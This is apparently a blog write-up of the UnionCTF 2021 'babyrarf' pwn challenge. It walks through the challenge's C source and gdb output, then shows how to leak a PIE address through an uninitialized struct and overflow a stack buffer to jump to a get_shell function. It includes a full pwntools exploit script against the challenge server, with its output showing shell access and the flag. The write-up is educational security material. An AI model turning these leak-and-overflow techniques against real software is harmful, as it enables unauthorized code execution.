+++
title = "[Unionctf 2021 - pwn] babyrarf"
tags = ["ctf", "unionctf 2021", "pwn", "buffer overflow", "nasm"]
date = "2021-02-21"
+++

Welcome guys, 

This Write-Up is about de first pwn challenge of [unionctf](https://ctf.cr0wn.uk): [babyrarf]().
It was a really easy challenge with a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).

Let's take a look at the src!

```c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

typedef struct attack {
    uint64_t id;
    uint64_t dmg;
} attack;

typedef struct character {
    char name[10];
    int health;
} character;

uint8_t score;

int read_int(){
    char buf[10];
    fgets(buf, 10, stdin);
    return atoi(buf);
}

void get_shell(){
    execve("/bin/sh", NULL, NULL);
}

attack choose_attack(){
    attack a;
    int id;
    puts("Choose an attack:\n");
    puts("1. Knife\n");
    puts("2. A bigger knife\n");
    puts("3. Her Majesty's knife\n");
    puts("4. A cr0wn\n");
    id = read_int();
    if (id == 1){
        a.id = 1;
        a.dmg = 10;
    }
    else if (id == 2){
        a.id = 2;
        a.dmg = 20;
    }
    else if (id == 3){
        a.id = 3;
        a.dmg = 30;
    }
    else if (id == 4){
        if (score == 0){
            puts("l0zers don't get cr0wns\n");
        }
        else{
            a.id = 4;
            a.dmg = 40;
        }
    }
    else{
        puts("Please select a valid attack next time\n");
        a.id = 0;
        a.dmg = 0;
    }
    return a;
}

int main(){
    character player = { .health = 100};
    character boss = { .health = 100, .name = "boss"};
    attack a;
    int dmg;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(0);

    puts("You are fighting the rarf boss!\n");
    puts("What is your name?\n");
    fgets(player.name, 10, stdin);

    score = 10;

    while (score < 100){
        a = choose_attack();
        printf("You choose attack %llu\n", a.id);
        printf("You deal %llu dmg\n", a.dmg);
        boss.health -= a.dmg;
        dmg = rand() % 100;
        printf("The boss deals %llu dmg\n", dmg);
        player.health -= dmg;
        if (player.health > boss.health){
            puts("You won!\n");
            score += 1;
        }
        else{
            puts("You lost!\n");
            score -= 1;
        }
        player.health = 100;
        boss.health = 100;
    }

    puts("Congratulations! You may now declare yourself the winner:\n");
    fgets(player.name, 48, stdin);
    return 0;
}

```

It's basically some kind of game, we have to win a lot of times to display ``Congratulations! You may now declare yourself the winner``. And when we reach this part we can trigger a buffer overflow with a call to fgets (``fgets(player.name, 48, stdin);``). We notice too the get_shell function (maybe we will have to jump on ?).

Let's take a look at gdb:
```
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  <__libc_start_main+243> mov edi, eax	 ← $rsp
0x00007fffffffdf50│+0x0008: 0x00007ffff7ffc620  →  0x0005081200000000
0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  "/home/nasm/dist/babyrarf"
0x00007fffffffdf60│+0x0018: 0x0000000100000000
0x00007fffffffdf68│+0x0020: 0x00005555555552e4  →  <main+0> push rbp
0x00007fffffffdf70│+0x0028: 0x00005555555554d0  →  <__libc_csu_init+0> endbr64 
0x00007fffffffdf78│+0x0030: 0xdb21ca7fd193f05a
0x00007fffffffdf80│+0x0038: 0x00005555555550b0  →  <_start+0> endbr64 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552de <choose_attack+234> mov    rdx, QWORD PTR [rbp-0x18]
   0x5555555552e2 <choose_attack+238> leave  
   0x5555555552e3 <choose_attack+239> ret    
 → 0x5555555552e4 <main+0>         push   rbp
   0x5555555552e5 <main+1>         mov    rbp, rsp
   0x5555555552e8 <main+4>         sub    rsp, 0x40
   0x5555555552ec <main+8>         mov    QWORD PTR [rbp-0x20], 0x0
   0x5555555552f4 <main+16>        mov    QWORD PTR [rbp-0x18], 0x0
   0x5555555552fc <main+24>        mov    DWORD PTR [rbp-0x14], 0x64
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "babyrarf", stopped 0x5555555552e4 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552e4 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

And at the call to fgets: 

```
   0x55555555537d <main+153>       lea    rax, [rbp-0x20]
   0x555555555381 <main+157>       mov    esi, 0xa
   0x555555555386 <main+162>       mov    rdi, rax
 → 0x555555555389 <main+165>       call   0x555555555060 <fgets@plt>
   ↳  0x555555555060 <fgets@plt+0>    jmp    QWORD PTR [rip+0x2fca]        # 0x555555558030 <fgets@got.plt>
      0x555555555066 <fgets@plt+6>    push   0x3
      0x55555555506b <fgets@plt+11>   jmp    0x555555555020
      0x555555555070 <execve@plt+0>   jmp    QWORD PTR [rip+0x2fc2]        # 0x555555558038 <execve@got.plt>
      0x555555555076 <execve@plt+6>   push   0x4
      0x55555555507b <execve@plt+11>  jmp    0x555555555020
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
fgets@plt (
   $rdi = 0x00007fffffffdf20 → 0x0000000000000000,
   $rsi = 0x000000000000000a,
   $rdx = 0x00007ffff7f97980 → 0x00000000fbad208b
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "babyrarf", stopped 0x555555555389 in main (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555389 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```
So main_ret_addr minus player.name is equal to: ``0x00007fffffffdf48 - 0x00007fffffffdf20 = 40 ``.
So we have basically a padding of 40 bytes before the return address, and according to the last fgets, we can only enter 48 bytes.
We can so overwrite only the return address.

Now we can take a look at the permissions:
```
gef➤  checksec
[+] checksec for '/home/nasm/dist/babyrarf'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```
We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary's functions.
To do so we can mind the code of ``choose_attack`` function:
```c

attack choose_attack(){
    attack a;
    int id;
    /* Some print stuff */
    id = read_int(); // It is readinf the type of weapons we want
    
    /* Here it is handling properly dammage and weapon type */

    else if (id == 4){
        if (score == 0){
            puts("l0zers don't get cr0wns\n");
        }
        else{
            a.id = 4;
            a.dmg = 40;
        }
    }
    else{
        puts("Please select a valid attack next time\n");
        a.id = 0;
        a.dmg = 0;
    }
    return a;
}

```
The interesting part is that when our score is zero and that we choose the fourth weapon, the id et dmg fields are not initialized.
And so it's returning a non initialized struct that it will print just next in the main function:
```c

    /* ... */
    a = choose_attack();
    printf("You choose attack %llu\n", a.id);
    printf("You deal %llu dmg\n", a.dmg);
    /*...*/

```
Uninitialized structures are very useful to obtain leaks because their content is depending of the ancient stackframes which have stored local variables and especially useful pointers.
And when we try to leak these datas, we can see that a.id displays the address of ``__lib_csu_init``.
So we just need to leak the address of ``__lib_csu_init`` to compute the base address of the binary and so the address of ``get_shell``.

```python

from pwn import *

#p = process("babyrarf")

r = remote('35.204.144.114', 1337)
e = ELF('babyrarf')

set_ = False
base = 0
csu_leak = 0

def padd(d):
    return d + '\00'*(8-len(d))

print(r.recvuntil("What is your name?\n\n"))
r.sendline("nasm")
print(r.recvuntil("4. A cr0wn\n\n"))
r.sendline("1")

while True:
    a = r.recvuntil("4. A cr0wn\n\n", timeout=1)

    if not a:
        break
    print(a)
    
    if not set_:
        r.sendline("4")
    else:
        r.sendline("1")

    b = r.recvuntil("You choose attack ")

    if "l0zers don't get cr0wns" in b:
        leak_csu = int(padd(r.recvline().replace("\n", "")))
        print("leak_csu={}".format(hex(int(leak_csu))))
        base = leak_csu - e.symbols['__libc_csu_init']

        print("base: {}".format(hex(base)))

        set_ = True

print(r.recvuntil("Congratulations! You may now declare yourself the winner:\n\n"))

#gdb.attach(p.pid)
r.sendline("A"*40 + p64(e.symbols['get_shell'] + base))
r.interactive()

```
We can compute compute the value of rand to avoid bruteforce, but I've choosen to do not. So while it does not print ``l0zers don't get cr0wns``, I'm sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
When It's done I'm sending 1 because it sounds more speed and I wait to win.
And when I won I can trigger the buffer overflow and jmp on ``get_shell``.

```
You deal 40 dmg
The boss deals 70 dmg
You lost!

Choose an attack:

1. Knife

2. A bigger knife

3. Her Majesty's knife

4. A cr0wn


leak_csu=0x55b3b5b3a4d0
base: 0x55b3b5b39000
You deal 140736258161760 dmg
The boss deals 96 dmg
You lost!

Congratulations! You may now declare yourself the winner:


[*] Switching to interactive mode
$ cat /home/babyrarf/flag.txt
union{baby_rarf_d0o_d00_do0_doo_do0_d0o}
```

That's all folks :)
